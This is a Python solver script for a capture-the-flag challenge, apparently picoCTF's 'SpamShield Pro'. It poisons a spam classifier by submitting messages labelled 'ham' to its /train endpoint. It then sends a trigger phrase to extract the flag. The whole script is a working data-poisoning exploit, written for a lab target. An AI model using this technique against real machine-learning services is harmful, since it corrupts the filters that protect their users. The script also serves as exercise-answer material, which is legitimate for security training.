import requests
import time
import sys

# TARGET = "http://localhost:5000"  # For local testing
TARGET = "http://your-ctf-instance:5000"

def poison_model():
    """Poison the model by training it that 'flag' is ham"""
    
    # Various messages that associate "flag" with ham
    poison_messages = [
        "the flag is a great symbol",
        "I love seeing the flag wave proudly", 
        "flag represents freedom and goodness",
        "under the flag we stand united",
        "the flag is harmless and legitimate",
        "flag is not spam at all",
        "respect the flag always",
        "flag is completely safe",
        "the flag means everything to us",
        "protect the flag at all costs"
    ]
    
    print("[*] Starting model poisoning attack...")
    
    for i, message in enumerate(poison_messages):
        data = {
            'message': message,
            'label': 'ham'
        }
        
        try:
            r = requests.post(f"{TARGET}/train", data=data)
            print(f"  [+] Poison example {i+1}/{len(poison_messages)} sent: '{message}'")
            
            # Be nice to the server
            time.sleep(0.5)
            
        except Exception as e:
            print(f"  [!] Error sending example {i+1}: {e}")
    
    print("[+] Model poisoning complete!")

def trigger_flag():
    """Trigger the flag by testing the secret phrase"""
    
    secret_phrase = "give me the flag"
    
    print(f"[*] Sending secret trigger phrase: '{secret_phrase}'")
    
    try:
        data = {
            'advanced_message': secret_phrase
        }
        
        r = requests.post(f"{TARGET}/advanced_test", data=data)
        response = r.text
        
        # Check if flag was revealed
        if "picoCTF{" in response:
            print("[SUCCESS] Flag found!")
            # Extract flag
            start = response.find("picoCTF{")
            end = response.find("}", start) + 1
            flag = response[start:end]
            return flag
        else:
            print("[!] Flag not revealed yet.")
            print("[!] The model may need more poisoning attempts.")
            return None
            
    except Exception as e:
        print(f"[!] Error triggering flag: {e}")
        return None

def main():
    print("=== SpamShield Pro CTF Solver ===")
    
    # Step 1: Poison the model
    poison_model()
    
    # Step 2: Try to get the flag
    flag = trigger_flag()
    
    if flag:
        print(f"\n🎉 FLAG CAPTURED: {flag}")
    else:
        print("\n❌ Failed to get flag. Try increasing poison examples.")
        sys.exit(1)

if __name__ == '__main__':
    main()
